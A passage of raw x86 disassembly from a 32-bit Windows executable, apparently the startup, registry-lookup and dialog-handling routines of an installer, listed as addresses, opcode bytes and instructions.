  4032f5:	0f 84 e5 00 00 00    	je     0x4033e0
  4032fb:	68 10 00 20 00       	push   $0x200010
  403300:	ff 74 24 14          	push   0x14(%esp)
  403304:	e8 c4 1f 00 00       	call   0x4052cd
  403309:	6a 02                	push   $0x2
  40330b:	ff 15 a0 70 40 00    	call   *0x4070a0
  403311:	68 40 91 40 00       	push   $0x409140
  403316:	55                   	push   %ebp
  403317:	e8 0c 27 00 00       	call   0x405a28
  40331c:	be 00 00 48 00       	mov    $0x480000,%esi
  403321:	56                   	push   %esi
  403322:	55                   	push   %ebp
  403323:	ff 15 f0 70 40 00    	call   *0x4070f0
  403329:	85 c0                	test   %eax,%eax
  40332b:	74 b9                	je     0x4032e6
  40332d:	53                   	push   %ebx
  40332e:	55                   	push   %ebp
  40332f:	ff 15 80 70 40 00    	call   *0x407080
  403335:	55                   	push   %ebp
  403336:	ff 15 74 70 40 00    	call   *0x407074
  40333c:	38 1d 00 c0 47 00    	cmp    %bl,0x47c000
  403342:	75 0b                	jne    0x40334f
  403344:	56                   	push   %esi
  403345:	68 00 c0 47 00       	push   $0x47c000
  40334a:	e8 bd 26 00 00       	call   0x405a0c
  40334f:	ff 74 24 1c          	push   0x1c(%esp)
  403353:	68 00 20 45 00       	push   $0x452000
  403358:	e8 af 26 00 00       	call   0x405a0c
  40335d:	6a 1a                	push   $0x1a
  40335f:	66 c7 05 00 40 45 00 	movw   $0x41,0x454000
  403366:	41 00 
  403368:	5f                   	pop    %edi
  403369:	be 98 17 43 00       	mov    $0x431798,%esi
  40336e:	a1 70 1b 45 00       	mov    0x451b70,%eax
  403373:	ff b0 20 01 00 00    	push   0x120(%eax)
  403379:	56                   	push   %esi
  40337a:	e8 af 26 00 00       	call   0x405a2e
  40337f:	56                   	push   %esi
  403380:	ff 15 44 71 40 00    	call   *0x407144
  403386:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40338a:	74 3f                	je     0x4033cb
  40338c:	6a 01                	push   $0x1
  40338e:	56                   	push   %esi
  40338f:	68 00 80 48 00       	push   $0x488000
  403394:	ff 15 9c 70 40 00    	call   *0x40709c
  40339a:	85 c0                	test   %eax,%eax
  40339c:	74 2d                	je     0x4033cb
  40339e:	53                   	push   %ebx
  40339f:	56                   	push   %esi
  4033a0:	e8 b5 23 00 00       	call   0x40575a
  4033a5:	a1 70 1b 45 00       	mov    0x451b70,%eax
  4033aa:	ff b0 24 01 00 00    	push   0x124(%eax)
  4033b0:	56                   	push   %esi
  4033b1:	e8 78 26 00 00       	call   0x405a2e
  4033b6:	56                   	push   %esi
  4033b7:	e8 b0 1e 00 00       	call   0x40526c
  4033bc:	3b c3                	cmp    %ebx,%eax
  4033be:	74 0b                	je     0x4033cb
  4033c0:	50                   	push   %eax
  4033c1:	ff 15 ec 70 40 00    	call   *0x4070ec
  4033c7:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4033cb:	fe 05 00 40 45 00    	incb   0x454000
  4033d1:	4f                   	dec    %edi
  4033d2:	75 9a                	jne    0x40336e
  4033d4:	53                   	push   %ebx
  4033d5:	55                   	push   %ebp
  4033d6:	e8 7f 23 00 00       	call   0x40575a
  4033db:	e9 06 ff ff ff       	jmp    0x4032e6
  4033e0:	39 1d f4 1b 45 00    	cmp    %ebx,0x451bf4
  4033e6:	74 7b                	je     0x403463
  4033e8:	6a 03                	push   $0x3
  4033ea:	e8 3f 29 00 00       	call   0x405d2e
  4033ef:	6a 04                	push   $0x4
  4033f1:	8b e8                	mov    %eax,%ebp
  4033f3:	e8 36 29 00 00       	call   0x405d2e
  4033f8:	6a 05                	push   $0x5
  4033fa:	8b f0                	mov    %eax,%esi
  4033fc:	e8 2d 29 00 00       	call   0x405d2e
  403401:	3b eb                	cmp    %ebx,%ebp
  403403:	8b f8                	mov    %eax,%edi
  403405:	74 48                	je     0x40344f
  403407:	3b f3                	cmp    %ebx,%esi
  403409:	74 44                	je     0x40344f
  40340b:	3b fb                	cmp    %ebx,%edi
  40340d:	74 40                	je     0x40344f
  40340f:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403413:	50                   	push   %eax
  403414:	6a 28                	push   $0x28
  403416:	ff 15 98 70 40 00    	call   *0x407098
  40341c:	50                   	push   %eax
  40341d:	ff d5                	call   *%ebp
  40341f:	85 c0                	test   %eax,%eax
  403421:	74 2c                	je     0x40344f
  403423:	8d 44 24 24          	lea    0x24(%esp),%eax
  403427:	50                   	push   %eax
  403428:	68 2c 91 40 00       	push   $0x40912c
  40342d:	53                   	push   %ebx
  40342e:	ff d6                	call   *%esi
  403430:	53                   	push   %ebx
  403431:	53                   	push   %ebx
  403432:	8d 44 24 28          	lea    0x28(%esp),%eax
  403436:	53                   	push   %ebx
  403437:	50                   	push   %eax
  403438:	53                   	push   %ebx
  403439:	ff 74 24 30          	push   0x30(%esp)
  40343d:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  403444:	00 
  403445:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%esp)
  40344c:	00 
  40344d:	ff d7                	call   *%edi
  40344f:	53                   	push   %ebx
  403450:	6a 02                	push   $0x2
  403452:	ff 15 24 72 40 00    	call   *0x407224
  403458:	85 c0                	test   %eax,%eax
  40345a:	75 07                	jne    0x403463
  40345c:	6a 09                	push   $0x9
  40345e:	e8 a8 df ff ff       	call   0x40140b
  403463:	a1 0c 1c 45 00       	mov    0x451c0c,%eax
  403468:	83 f8 ff             	cmp    $0xffffffff,%eax
  40346b:	74 04                	je     0x403471
  40346d:	89 44 24 18          	mov    %eax,0x18(%esp)
  403471:	ff 74 24 18          	push   0x18(%esp)
  403475:	ff 15 a0 70 40 00    	call   *0x4070a0
  40347b:	a1 14 90 40 00       	mov    0x409014,%eax
  403480:	83 f8 ff             	cmp    $0xffffffff,%eax
  403483:	74 0e                	je     0x403493
  403485:	50                   	push   %eax
  403486:	ff 15 ec 70 40 00    	call   *0x4070ec
  40348c:	83 0d 14 90 40 00 ff 	orl    $0xffffffff,0x409014
  403493:	e8 28 00 00 00       	call   0x4034c0
  403498:	6a 07                	push   $0x7
  40349a:	68 00 60 48 00       	push   $0x486000
  40349f:	e8 8d 1e 00 00       	call   0x405331
  4034a4:	c3                   	ret
  4034a5:	56                   	push   %esi
  4034a6:	8b 35 9c 37 43 00    	mov    0x43379c,%esi
  4034ac:	eb 0a                	jmp    0x4034b8
  4034ae:	ff 74 24 08          	push   0x8(%esp)
  4034b2:	ff 56 04             	call   *0x4(%esi)
  4034b5:	8b 36                	mov    (%esi),%esi
  4034b7:	59                   	pop    %ecx
  4034b8:	85 f6                	test   %esi,%esi
  4034ba:	75 f2                	jne    0x4034ae
  4034bc:	5e                   	pop    %esi
  4034bd:	c2 04 00             	ret    $0x4
  4034c0:	56                   	push   %esi
  4034c1:	8b 35 9c 37 43 00    	mov    0x43379c,%esi
  4034c7:	6a 00                	push   $0x0
  4034c9:	e8 d7 ff ff ff       	call   0x4034a5
  4034ce:	85 f6                	test   %esi,%esi
  4034d0:	74 1a                	je     0x4034ec
  4034d2:	57                   	push   %edi
  4034d3:	8b fe                	mov    %esi,%edi
  4034d5:	8b 36                	mov    (%esi),%esi
  4034d7:	ff 77 08             	push   0x8(%edi)
  4034da:	ff 15 18 71 40 00    	call   *0x407118
  4034e0:	57                   	push   %edi
  4034e1:	ff 15 fc 70 40 00    	call   *0x4070fc
  4034e7:	85 f6                	test   %esi,%esi
  4034e9:	75 e8                	jne    0x4034d3
  4034eb:	5f                   	pop    %edi
  4034ec:	83 25 9c 37 43 00 00 	andl   $0x0,0x43379c
  4034f3:	5e                   	pop    %esi
  4034f4:	c3                   	ret
  4034f5:	a1 9c 37 43 00       	mov    0x43379c,%eax
  4034fa:	eb 0b                	jmp    0x403507
  4034fc:	8b 48 08             	mov    0x8(%eax),%ecx
  4034ff:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403503:	74 0a                	je     0x40350f
  403505:	8b 00                	mov    (%eax),%eax
  403507:	85 c0                	test   %eax,%eax
  403509:	75 f1                	jne    0x4034fc
  40350b:	40                   	inc    %eax
  40350c:	c2 04 00             	ret    $0x4
  40350f:	33 c0                	xor    %eax,%eax
  403511:	eb f9                	jmp    0x40350c
  403513:	56                   	push   %esi
  403514:	8b 74 24 08          	mov    0x8(%esp),%esi
  403518:	56                   	push   %esi
  403519:	e8 d7 ff ff ff       	call   0x4034f5
  40351e:	85 c0                	test   %eax,%eax
  403520:	75 03                	jne    0x403525
  403522:	40                   	inc    %eax
  403523:	eb 2c                	jmp    0x403551
  403525:	6a 0c                	push   $0xc
  403527:	6a 40                	push   $0x40
  403529:	ff 15 00 71 40 00    	call   *0x407100
  40352f:	85 c0                	test   %eax,%eax
  403531:	74 1b                	je     0x40354e
  403533:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403537:	89 70 08             	mov    %esi,0x8(%eax)
  40353a:	89 48 04             	mov    %ecx,0x4(%eax)
  40353d:	8b 0d 9c 37 43 00    	mov    0x43379c,%ecx
  403543:	89 08                	mov    %ecx,(%eax)
  403545:	a3 9c 37 43 00       	mov    %eax,0x43379c
  40354a:	33 c0                	xor    %eax,%eax
  40354c:	eb 03                	jmp    0x403551
  40354e:	83 c8 ff             	or     $0xffffffff,%eax
  403551:	5e                   	pop    %esi
  403552:	c2 08 00             	ret    $0x8
  403555:	83 ec 14             	sub    $0x14,%esp
  403558:	53                   	push   %ebx
  403559:	55                   	push   %ebp
  40355a:	56                   	push   %esi
  40355b:	8b 35 70 1b 45 00    	mov    0x451b70,%esi
  403561:	57                   	push   %edi
  403562:	6a 06                	push   $0x6
  403564:	e8 c5 27 00 00       	call   0x405d2e
  403569:	33 db                	xor    %ebx,%ebx
  40356b:	3b c3                	cmp    %ebx,%eax
  40356d:	74 12                	je     0x403581
  40356f:	ff d0                	call   *%eax
  403571:	0f b7 c0             	movzwl %ax,%eax
  403574:	50                   	push   %eax
  403575:	68 00 20 48 00       	push   $0x482000
  40357a:	e8 eb 23 00 00       	call   0x40596a
  40357f:	eb 4a                	jmp    0x4035cb
  403581:	bf e0 b7 43 00       	mov    $0x43b7e0,%edi
  403586:	53                   	push   %ebx
  403587:	57                   	push   %edi
  403588:	53                   	push   %ebx
  403589:	68 e4 72 40 00       	push   $0x4072e4
  40358e:	68 01 00 00 80       	push   $0x80000001
  403593:	c7 05 00 20 48 00 30 	movl   $0x7830,0x482000
  40359a:	78 00 00 
  40359d:	e8 51 23 00 00       	call   0x4058f3
  4035a2:	38 1d e0 b7 43 00    	cmp    %bl,0x43b7e0
  4035a8:	75 16                	jne    0x4035c0
  4035aa:	53                   	push   %ebx
  4035ab:	57                   	push   %edi
  4035ac:	68 02 73 40 00       	push   $0x407302
  4035b1:	68 bc 72 40 00       	push   $0x4072bc
  4035b6:	68 03 00 00 80       	push   $0x80000003
  4035bb:	e8 33 23 00 00       	call   0x4058f3
  4035c0:	57                   	push   %edi
  4035c1:	68 00 20 48 00       	push   $0x482000
  4035c6:	e8 5d 24 00 00       	call   0x405a28
  4035cb:	e8 4e 02 00 00       	call   0x40381e
  4035d0:	a1 78 1b 45 00       	mov    0x451b78,%eax
  4035d5:	bd 00 c0 47 00       	mov    $0x47c000,%ebp
  4035da:	83 e0 20             	and    $0x20,%eax
  4035dd:	55                   	push   %ebp
  4035de:	a3 e0 1b 45 00       	mov    %eax,0x451be0
  4035e3:	c7 05 fc 1b 45 00 00 	movl   $0x10000,0x451bfc
  4035ea:	00 01 00 
  4035ed:	e8 ee 1f 00 00       	call   0x4055e0
  4035f2:	85 c0                	test   %eax,%eax
  4035f4:	0f 85 81 00 00 00    	jne    0x40367b
  4035fa:	8b 4e 48             	mov    0x48(%esi),%ecx
  4035fd:	3b cb                	cmp    %ebx,%ecx
  4035ff:	74 7a                	je     0x40367b
  403601:	8b 56 4c             	mov    0x4c(%esi),%edx
  403604:	a1 98 1b 45 00       	mov    0x451b98,%eax
  403609:	bf 00 9b 44 00       	mov    $0x449b00,%edi
  40360e:	53                   	push   %ebx
  40360f:	03 d0                	add    %eax,%edx
  403611:	57                   	push   %edi
  403612:	03 c8                	add    %eax,%ecx
  403614:	52                   	push   %edx
  403615:	51                   	push   %ecx
  403616:	ff 76 44             	push   0x44(%esi)
  403619:	e8 d5 22 00 00       	call   0x4058f3
  40361e:	a0 00 9b 44 00       	mov    0x449b00,%al
  403623:	3a c3                	cmp    %bl,%al
  403625:	74 54                	je     0x40367b
  403627:	3c 22                	cmp    $0x22,%al
  403629:	75 0f                	jne    0x40363a
  40362b:	bf 01 9b 44 00       	mov    $0x449b01,%edi
  403630:	6a 22                	push   $0x22
  403632:	57                   	push   %edi
  403633:	e8 f2 1e 00 00       	call   0x40552a
  403638:	88 18                	mov    %bl,(%eax)
  40363a:	57                   	push   %edi
  40363b:	e8 e2 23 00 00       	call   0x405a22
  403640:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403644:	3b c7                	cmp    %edi,%eax
  403646:	76 26                	jbe    0x40366e
  403648:	68 bc 91 40 00       	push   $0x4091bc
  40364d:	50                   	push   %eax
  40364e:	ff 15 f0 70 40 00    	call   *0x4070f0
  403654:	85 c0                	test   %eax,%eax
  403656:	75 16                	jne    0x40366e
  403658:	57                   	push   %edi
  403659:	ff 15 78 70 40 00    	call   *0x407078
  40365f:	83 f8 ff             	cmp    $0xffffffff,%eax
  403662:	74 04                	je     0x403668
  403664:	a8 10                	test   $0x10,%al
  403666:	75 06                	jne    0x40366e
  403668:	57                   	push   %edi
  403669:	e8 d8 1e 00 00       	call   0x405546
  40366e:	57                   	push   %edi
  40366f:	e8 8b 1e 00 00       	call   0x4054ff
  403674:	50                   	push   %eax
  403675:	55                   	push   %ebp
  403676:	e8 91 23 00 00       	call   0x405a0c
  40367b:	55                   	push   %ebp
  40367c:	e8 5f 1f 00 00       	call   0x4055e0
  403681:	85 c0                	test   %eax,%eax
  403683:	75 0c                	jne    0x403691
  403685:	ff b6 18 01 00 00    	push   0x118(%esi)
  40368b:	55                   	push   %ebp
  40368c:	e8 9d 23 00 00       	call   0x405a2e
  403691:	68 40 80 00 00       	push   $0x8040
  403696:	53                   	push   %ebx
  403697:	53                   	push   %ebx
  403698:	6a 01                	push   $0x1
  40369a:	6a 67                	push   $0x67
  40369c:	ff 35 60 1b 45 00    	push   0x451b60
  4036a2:	ff 15 34 72 40 00    	call   *0x407234
  4036a8:	a3 48 db 44 00       	mov    %eax,0x44db48
  4036ad:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  4036b1:	bf 00 db 44 00       	mov    $0x44db00,%edi
  4036b6:	0f 84 89 00 00 00    	je     0x403745
  4036bc:	8b 0d 60 1b 45 00    	mov    0x451b60,%ecx
  4036c2:	a3 14 db 44 00       	mov    %eax,0x44db14
  4036c7:	8d 44 24 10          	lea    0x10(%esp),%eax
  4036cb:	57                   	push   %edi
  4036cc:	c7 44 24 14 5f 4e 62 	movl   $0x624e5f,0x14(%esp)
  4036d3:	00 
  4036d4:	c7 05 04 db 44 00 00 	movl   $0x401000,0x44db04
  4036db:	10 40 00 
  4036de:	89 0d 10 db 44 00    	mov    %ecx,0x44db10
  4036e4:	a3 24 db 44 00       	mov    %eax,0x44db24
  4036e9:	ff 15 bc 71 40 00    	call   *0x4071bc
  4036ef:	66 85 c0             	test   %ax,%ax
  4036f2:	0f 84 1c 01 00 00    	je     0x403814
  4036f8:	8d 44 24 14          	lea    0x14(%esp),%eax
  4036fc:	53                   	push   %ebx
  4036fd:	50                   	push   %eax
  4036fe:	53                   	push   %ebx
  4036ff:	6a 30                	push   $0x30
  403701:	ff 15 0c 72 40 00    	call   *0x40720c
  403707:	53                   	push   %ebx
  403708:	ff 35 60 1b 45 00    	push   0x451b60
  40370e:	8b 44 24 28          	mov    0x28(%esp),%eax
  403712:	2b 44 24 20          	sub    0x20(%esp),%eax
  403716:	53                   	push   %ebx
  403717:	53                   	push   %ebx
  403718:	50                   	push   %eax
  403719:	8b 44 24 30          	mov    0x30(%esp),%eax
  40371d:	2b 44 24 28          	sub    0x28(%esp),%eax
  403721:	50                   	push   %eax
  403722:	8d 44 24 28          	lea    0x28(%esp),%eax
  403726:	ff 74 24 30          	push   0x30(%esp)
  40372a:	ff 74 24 30          	push   0x30(%esp)
  40372e:	68 00 00 00 80       	push   $0x80000000
  403733:	53                   	push   %ebx
  403734:	50                   	push   %eax
  403735:	68 80 00 00 00       	push   $0x80
  40373a:	ff 15 10 72 40 00    	call   *0x407210
  403740:	a3 b8 b7 43 00       	mov    %eax,0x43b7b8
  403745:	53                   	push   %ebx
  403746:	e8 c0 dc ff ff       	call   0x40140b
  40374b:	85 c0                	test   %eax,%eax
  40374d:	74 08                	je     0x403757
  40374f:	6a 02                	push   $0x2
  403751:	58                   	pop    %eax
  403752:	e9 bf 00 00 00       	jmp    0x403816
  403757:	e8 c2 00 00 00       	call   0x40381e
  40375c:	39 1d 00 1c 45 00    	cmp    %ebx,0x451c00
  403762:	0f 85 83 00 00 00    	jne    0x4037eb
  403768:	6a 05                	push   $0x5
  40376a:	ff 35 b8 b7 43 00    	push   0x43b7b8
  403770:	ff 15 60 72 40 00    	call   *0x407260
  403776:	8b 35 b4 70 40 00    	mov    0x4070b4,%esi
  40377c:	68 b0 72 40 00       	push   $0x4072b0
  403781:	ff d6                	call   *%esi
  403783:	85 c0                	test   %eax,%eax
  403785:	75 07                	jne    0x40378e
  403787:	68 a4 72 40 00       	push   $0x4072a4
  40378c:	ff d6                	call   *%esi
  40378e:	8b 35 14 72 40 00    	mov    0x407214,%esi
  403794:	bd 98 72 40 00       	mov    $0x407298,%ebp
  403799:	57                   	push   %edi
  40379a:	55                   	push   %ebp
  40379b:	53                   	push   %ebx
  40379c:	ff d6                	call   *%esi
  40379e:	85 c0                	test   %eax,%eax
  4037a0:	75 16                	jne    0x4037b8
  4037a2:	57                   	push   %edi
  4037a3:	68 8c 72 40 00       	push   $0x40728c
  4037a8:	53                   	push   %ebx
  4037a9:	ff d6                	call   *%esi
  4037ab:	57                   	push   %edi
  4037ac:	89 2d 24 db 44 00    	mov    %ebp,0x44db24
  4037b2:	ff 15 bc 71 40 00    	call   *0x4071bc
  4037b8:	a1 40 db 44 00       	mov    0x44db40,%eax
  4037bd:	53                   	push   %ebx
  4037be:	83 c0 69             	add    $0x69,%eax
  4037c1:	68 eb 38 40 00       	push   $0x4038eb
  4037c6:	0f b7 c0             	movzwl %ax,%eax
  4037c9:	53                   	push   %ebx
  4037ca:	50                   	push   %eax
  4037cb:	ff 35 60 1b 45 00    	push   0x451b60
  4037d1:	ff 15 18 72 40 00    	call   *0x407218
  4037d7:	6a 05                	push   $0x5
  4037d9:	8b f0                	mov    %eax,%esi
  4037db:	e8 2b dc ff ff       	call   0x40140b
  4037e0:	6a 01                	push   $0x1
  4037e2:	e8 be fc ff ff       	call   0x4034a5
  4037e7:	8b c6                	mov    %esi,%eax
  4037e9:	eb 2b                	jmp    0x403816
  4037eb:	53                   	push   %ebx
  4037ec:	e8 8b 16 00 00       	call   0x404e7c
  4037f1:	85 c0                	test   %eax,%eax
  4037f3:	74 18                	je     0x40380d
  4037f5:	39 1d 2c db 44 00    	cmp    %ebx,0x44db2c
  4037fb:	0f 85 4e ff ff ff    	jne    0x40374f
  403801:	6a 02                	push   $0x2
  403803:	e8 03 dc ff ff       	call   0x40140b
  403808:	e9 42 ff ff ff       	jmp    0x40374f
  40380d:	6a 01                	push   $0x1
  40380f:	e8 f7 db ff ff       	call   0x40140b
  403814:	33 c0                	xor    %eax,%eax
  403816:	5f                   	pop    %edi
  403817:	5e                   	pop    %esi
  403818:	5d                   	pop    %ebp
  403819:	5b                   	pop    %ebx
  40381a:	83 c4 14             	add    $0x14,%esp
  40381d:	c3                   	ret
  40381e:	53                   	push   %ebx
  40381f:	55                   	push   %ebp
  403820:	56                   	push   %esi
  403821:	57                   	push   %edi
  403822:	bf 00 20 48 00       	mov    $0x482000,%edi
  403827:	bb ff ff 00 00       	mov    $0xffff,%ebx
  40382c:	57                   	push   %edi
  40382d:	e8 51 21 00 00       	call   0x405983
  403832:	8b 35 a4 1b 45 00    	mov    0x451ba4,%esi
  403838:	85 f6                	test   %esi,%esi
  40383a:	74 45                	je     0x403881
  40383c:	8b 0d 70 1b 45 00    	mov    0x451b70,%ecx
  403842:	8b 49 64             	mov    0x64(%ecx),%ecx
  403845:	8b d1                	mov    %ecx,%edx
  403847:	0f af ce             	imul   %esi,%ecx
  40384a:	f7 da                	neg    %edx
  40384c:	03 0d a0 1b 45 00    	add    0x451ba0,%ecx
  403852:	03 ca                	add    %edx,%ecx
  403854:	4e                   	dec    %esi
  403855:	66 8b 29             	mov    (%ecx),%bp
  403858:	66 33 e8             	xor    %ax,%bp
  40385b:	23 eb                	and    %ebx,%ebp
  40385d:	66 85 ed             	test   %bp,%bp
  403860:	74 06                	je     0x403868
  403862:	85 f6                	test   %esi,%esi
  403864:	75 ec                	jne    0x403852
  403866:	eb 19                	jmp    0x403881
  403868:	8b 51 02             	mov    0x2(%ecx),%edx
  40386b:	89 15 40 db 44 00    	mov    %edx,0x44db40
  403871:	8b 51 06             	mov    0x6(%ecx),%edx
  403874:	89 15 08 1c 45 00    	mov    %edx,0x451c08
  40387a:	8d 51 0a             	lea    0xa(%ecx),%edx
  40387d:	85 d2                	test   %edx,%edx
  40387f:	75 12                	jne    0x403893
  403881:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403886:	75 07                	jne    0x40388f
  403888:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  40388d:	eb a3                	jmp    0x403832
  40388f:	33 db                	xor    %ebx,%ebx
  403891:	eb 9f                	jmp    0x403832
  403893:	89 15 3c db 44 00    	mov    %edx,0x44db3c
  403899:	0f b7 01             	movzwl (%ecx),%eax
  40389c:	50                   	push   %eax
  40389d:	57                   	push   %edi
  40389e:	e8 c7 20 00 00       	call   0x40596a
  4038a3:	6a fe                	push   $0xfffffffe
  4038a5:	68 60 db 44 00       	push   $0x44db60
  4038aa:	e8 7f 21 00 00       	call   0x405a2e
  4038af:	50                   	push   %eax
  4038b0:	ff 35 b8 b7 43 00    	push   0x43b7b8
  4038b6:	ff 15 f4 71 40 00    	call   *0x4071f4
  4038bc:	a1 8c 1b 45 00       	mov    0x451b8c,%eax
  4038c1:	8b 35 88 1b 45 00    	mov    0x451b88,%esi
  4038c7:	85 c0                	test   %eax,%eax
  4038c9:	74 1b                	je     0x4038e6
  4038cb:	8b f8                	mov    %eax,%edi
  4038cd:	8b 06                	mov    (%esi),%eax
  4038cf:	85 c0                	test   %eax,%eax
  4038d1:	74 0a                	je     0x4038dd
  4038d3:	50                   	push   %eax
  4038d4:	8d 46 18             	lea    0x18(%esi),%eax
  4038d7:	50                   	push   %eax
  4038d8:	e8 51 21 00 00       	call   0x405a2e
  4038dd:	81 c6 18 20 00 00    	add    $0x2018,%esi
  4038e3:	4f                   	dec    %edi
  4038e4:	75 e7                	jne    0x4038cd
  4038e6:	5f                   	pop    %edi
  4038e7:	5e                   	pop    %esi
  4038e8:	5d                   	pop    %ebp
  4038e9:	5b                   	pop    %ebx
  4038ea:	c3                   	ret
  4038eb:	83 ec 10             	sub    $0x10,%esp
  4038ee:	b9 10 01 00 00       	mov    $0x110,%ecx
  4038f3:	53                   	push   %ebx
  4038f4:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4038f8:	55                   	push   %ebp
  4038f9:	56                   	push   %esi
  4038fa:	3b d9                	cmp    %ecx,%ebx
  4038fc:	57                   	push   %edi
  4038fd:	0f 84 3b 01 00 00    	je     0x403a3e
  403903:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  403909:	0f 84 2f 01 00 00    	je     0x403a3e
  40390f:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403913:	33 ed                	xor    %ebp,%ebp
  403915:	83 fb 47             	cmp    $0x47,%ebx
  403918:	75 13                	jne    0x40392d
  40391a:	6a 13                	push   $0x13
  40391c:	55                   	push   %ebp
  40391d:	55                   	push   %ebp
  40391e:	55                   	push   %ebp
  40391f:	55                   	push   %ebp
  403920:	57                   	push   %edi
  403921:	ff 35 b8 b7 43 00    	push   0x43b7b8
  403927:	ff 15 88 71 40 00    	call   *0x407188
  40392d:	83 fb 05             	cmp    $0x5,%ebx
  403930:	75 18                	jne    0x40394a
  403932:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403936:	48                   	dec    %eax
  403937:	f7 d8                	neg    %eax
  403939:	1b c0                	sbb    %eax,%eax
  40393b:	23 c3                	and    %ebx,%eax
  40393d:	50                   	push   %eax
  40393e:	ff 35 b8 b7 43 00    	push   0x43b7b8
  403944:	ff 15 60 72 40 00    	call   *0x407260
  40394a:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  403950:	75 1a                	jne    0x40396c
  403952:	ff 35 38 db 44 00    	push   0x44db38
  403958:	ff 15 e8 71 40 00    	call   *0x4071e8
  40395e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403962:	a3 38 db 44 00       	mov    %eax,0x44db38
  403967:	e9 fc 03 00 00       	jmp    0x403d68
  40396c:	83 fb 11             	cmp    $0x11,%ebx
  40396f:	75 11                	jne    0x403982
  403971:	55                   	push   %ebp
  403972:	55                   	push   %ebp
  403973:	57                   	push   %edi
  403974:	ff 15 30 72 40 00    	call   *0x407230
  40397a:	33 c0                	xor    %eax,%eax
  40397c:	40                   	inc    %eax
  40397d:	e9 0b 04 00 00       	jmp    0x403d8d
  403982:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  403988:	0f 85 9d 00 00 00    	jne    0x403a2b
  40398e:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  403993:	56                   	push   %esi
  403994:	57                   	push   %edi
  403995:	ff 15 2c 72 40 00    	call   *0x40722c
  40399b:	8b f8                	mov    %eax,%edi
  40399d:	3b fd                	cmp    %ebp,%edi
  40399f:	74 1d                	je     0x4039be
  4039a1:	55                   	push   %ebp
  4039a2:	55                   	push   %ebp
  4039a3:	68 f3 00 00 00       	push   $0xf3
  4039a8:	57                   	push   %edi
  4039a9:	ff 15 44 72 40 00    	call   *0x407244
  4039af:	57                   	push   %edi
  4039b0:	ff 15 84 71 40 00    	call   *0x407184
  4039b6:	85 c0                	test   %eax,%eax
  4039b8:	0f 84 cd 03 00 00    	je     0x403d8b
  4039be:	83 fe 01             	cmp    $0x1,%esi
  4039c1:	75 03                	jne    0x4039c6
  4039c3:	56                   	push   %esi
  4039c4:	eb 2e                	jmp    0x4039f4
  4039c6:	83 fe 03             	cmp    $0x3,%esi
  4039c9:	75 0c                	jne    0x4039d7
  4039cb:	39 2d a4 91 40 00    	cmp    %ebp,0x4091a4
  4039d1:	7e 3f                	jle    0x403a12
  4039d3:	6a ff                	push   $0xffffffff
  4039d5:	eb 1d                	jmp    0x4039f4
  4039d7:	6a 02                	push   $0x2
  4039d9:	5f                   	pop    %edi
  4039da:	3b f7                	cmp    %edi,%esi
  4039dc:	75 34                	jne    0x403a12
  4039de:	39 2d ec 1b 45 00    	cmp    %ebp,0x451bec
  4039e4:	74 15                	je     0x4039fb
  4039e6:	57                   	push   %edi
  4039e7:	e8 1f da ff ff       	call   0x40140b
  4039ec:	89 3d a8 57 43 00    	mov    %edi,0x4357a8
  4039f2:	6a 78                	push   $0x78
  4039f4:	e8 9e 03 00 00       	call   0x403d97
  4039f9:	eb 30                	jmp    0x403a2b
  4039fb:	6a 03                	push   $0x3
  4039fd:	e8 09 da ff ff       	call   0x40140b
  403a02:	85 c0                	test   %eax,%eax
  403a04:	75 25                	jne    0x403a2b
  403a06:	c7 05 a8 57 43 00 01 	movl   $0x1,0x4357a8
  403a0d:	00 00 00 
  403a10:	eb e0                	jmp    0x4039f2
  403a12:	ff 74 24 30          	push   0x30(%esp)
  403a16:	ff 74 24 30          	push   0x30(%esp)
  403a1a:	68 11 01 00 00       	push   $0x111
  403a1f:	ff 35 38 db 44 00    	push   0x44db38
  403a25:	ff 15 44 72 40 00    	call   *0x407244
  403a2b:	ff 74 24 30          	push   0x30(%esp)
  403a2f:	ff 74 24 30          	push   0x30(%esp)
  403a33:	53                   	push   %ebx
  403a34:	e8 ec 03 00 00       	call   0x403e25
  403a39:	e9 4f 03 00 00       	jmp    0x403d8d
  403a3e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403a42:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403a46:	3b d9                	cmp    %ecx,%ebx
  403a48:	a3 c4 b7 43 00       	mov    %eax,0x43b7c4
  403a4d:	75 4d                	jne    0x403a9c
  403a4f:	8b 35 2c 72 40 00    	mov    0x40722c,%esi
  403a55:	6a 01                	push   $0x1
  403a57:	57                   	push   %edi
  403a58:	89 3d 68 1b 45 00    	mov    %edi,0x451b68
  403a5e:	ff d6                	call   *%esi
  403a60:	6a 02                	push   $0x2
  403a62:	57                   	push   %edi
  403a63:	a3 d8 b7 43 00       	mov    %eax,0x43b7d8
  403a68:	ff d6                	call   *%esi
  403a6a:	6a ff                	push   $0xffffffff
  403a6c:	6a 1c                	push   $0x1c
  403a6e:	57                   	push   %edi
  403a6f:	a3 a0 37 43 00       	mov    %eax,0x4337a0
  403a74:	e8 45 03 00 00       	call   0x403dbe
  403a79:	ff 35 48 db 44 00    	push   0x44db48
  403a7f:	6a f2                	push   $0xfffffff2
  403a81:	57                   	push   %edi
  403a82:	ff 15 80 71 40 00    	call   *0x407180
  403a88:	6a 04                	push   $0x4
  403a8a:	e8 7c d9 ff ff       	call   0x40140b
  403a8f:	a3 2c db 44 00       	mov    %eax,0x44db2c
  403a94:	33 c0                	xor    %eax,%eax
  403a96:	40                   	inc    %eax
